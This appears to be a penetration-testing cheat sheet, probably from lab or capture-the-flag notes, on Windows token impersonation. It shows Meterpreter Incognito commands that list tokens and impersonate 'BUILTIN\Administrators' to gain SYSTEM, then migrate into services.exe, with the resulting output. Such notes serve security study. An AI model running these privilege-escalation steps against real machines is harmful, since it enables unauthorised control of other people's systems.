## Windows Tokens

* `whoami /priv`

```
Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```

## Incognito Module

* `load incognito`
* `list_tokens -g`

```
Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\IIS_IUSRS
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\BFE
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\Dnscache
NT SERVICE\eventlog
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\MMCSS
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\RpcEptMapper
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\TrkWks
NT SERVICE\TrustedInstaller
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\WdiSystemHost
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv
```

```
Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\CryptSvc
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\LanmanWorkstation
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\netprofm
NT SERVICE\nsi
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ShellHWDetection
NT SERVICE\W32Time
NT SERVICE\WdiServiceHost
NT SERVICE\WinHttpAutoProxySvc
NT SERVICE\wscsvc
```

* `impersonate_token "BUILTIN\Administrators"`

```
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```

## Migrating Processes

* `ps  | grep "services.exe"`

```
Filtering on 'services.exe'

Process List
============

 PID  PPID  Name          Arch  Session  User                 Path
 ---  ----  ----          ----  -------  ----                 ----
 668  580   services.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\services.exe
```

* `migrate 668`
```
[*] Migrating from 536 to 668...
[*] Migration completed successfully.
```
